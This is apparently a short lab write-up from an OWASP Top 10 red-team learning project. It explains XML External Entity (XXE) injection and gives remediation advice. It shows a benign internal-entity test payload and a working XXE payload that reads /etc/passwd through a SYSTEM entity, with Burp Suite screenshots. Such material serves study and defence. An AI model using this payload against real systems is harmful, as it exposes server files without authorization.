# XML External Entity (XXE)

## Sensitive Data Exposure
<p>Is a vulnerability that abuses features of XML parsers/data. It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system.</p>

### Remediation:
<p>The best way to prevent this vulnerability is to disable XML external entities, use a different parser or library that is not vulnerable to XXE attacks, and validate and sanitize all user input.</p>

## XML External Entity (XXE) example:

### XXE Payload:

<p>Upload the following payload</p>

``` xml
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```

<p>We can see that the payload was able to successfully display name falcon feast</p>
<img src="https://github.com/Jay-Jay23/OWASP_Top_10/blob/main/RedTeam%20project/images/XXE.png" alt="XML">

<p>Using Burp Suite to see the request that was sent with the URL encoded payload</p>
<img src="https://github.com/Jay-Jay23/OWASP_Top_10/blob/main/RedTeam%20project/images/XXE1.png" alt="XML">

<p> Upload the following payload, to try and read the  /etc/passwd</p>

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

<p> Or push the captured request to repeater, to try and read the /etc/passwd</p>
<img src="https://github.com/Jay-Jay23/OWASP_Top_10/blob/main/RedTeam%20project/images/XXE2.png" alt="XML">

